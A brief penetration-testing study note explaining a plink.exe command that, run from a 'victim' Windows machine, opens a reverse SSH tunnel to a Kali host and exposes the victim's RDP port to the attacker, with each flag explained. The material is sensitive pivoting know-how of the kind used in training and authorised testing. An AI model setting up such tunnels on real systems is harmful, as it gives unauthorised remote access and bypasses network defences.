> Plink (PuTTY Link) is a command-line connection tool similar to UNIX ssh


#Port_Forwarding #SSH #SSH_Tunneling #Tunneling

Making an SSH connection to the Kali machine from Victim Windows
```cmd
plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.123.69
```
- `-ssh`
	- Establish an SSH connection. 
- `-l kali`
	- Specifies the username for SSH
- `-pw <YOUR PASSWORD HERE>`
	- Specifies the password for SSH
- `-R 127.0.0.1:9833:127.0.0.1:3389`
	- Sets up a reverse tunnel from the remote system to the local system
		- Maps the local port `127.0.0.1:9833` to the remote port `127.0.0.1:3389`.
	- `127.0.0.1:9833`
		- The socket we want to open on the Kali SSH server
	- `127.0.0.1:3389`
		- RDP server port on the loopback interface of jumphost that we want to forward packets to.
- `192.168.123.69`
	- The IP address of the remote system you want to connect to.